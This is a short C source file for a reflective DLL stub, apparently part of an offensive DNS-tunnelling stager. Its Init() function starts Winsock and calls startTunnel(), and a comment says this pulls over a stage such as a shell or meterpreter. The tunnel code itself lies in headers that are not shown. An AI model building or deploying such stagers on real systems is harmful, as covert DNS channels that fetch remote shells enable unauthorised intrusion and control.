//===============================================================================================//
// This is a stub for the actuall functionality of the DLL. Your code will start in Init()
//===============================================================================================//
#include "types.h"

#include "ReflectiveLoader.h"
#include "DNSResolver.h"
#include "queryOps.h"
#include "abstraction.h"

#include <stdlib.h>
#include "winsock2.h"
#include <windows.h>
#include "stdio.h"
#include "conio.h"

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;

//List of DNS Servers registered on the system
char dns_servers[10][100];

void testfun();

void testfun(){
	MessageBoxA( NULL, "Calls from other functions work", "Reflective Dll", MB_OK );
}
//===============================================================================================//
DLLEXPORT int Init( SOCKET socket )
{
	WSADATA firstsock;
	
	/*
	querydata* qd = malloc(sizeof(querydata));
	char* testStr;
	*/

	printf("\n");
	printf("===========================\n");
	printf("======INSIDE INIT =========\n");
	printf("===========================\n");
	printf("\n");

	
	printf("\nInitialising Winsock...\n");
	if (WSAStartup(MAKEWORD(2,2),&firstsock) != 0)
	{
		printf("[INIT] Failed. Error Code : %d",WSAGetLastError());
		return 1;
	} 
	
	/*
	* Step 0 : Start the DNS tunnel. This will also pull over the stage (shell, meterpreter, ...)
	*/
	startTunnel();

	//Sleep(2000);
	//testAbstractionServerSide();
	
	Sleep(1000000); //Stay alive for testing purposes.
	stopTunnel();

	return 0;
}
//===============================================================================================//
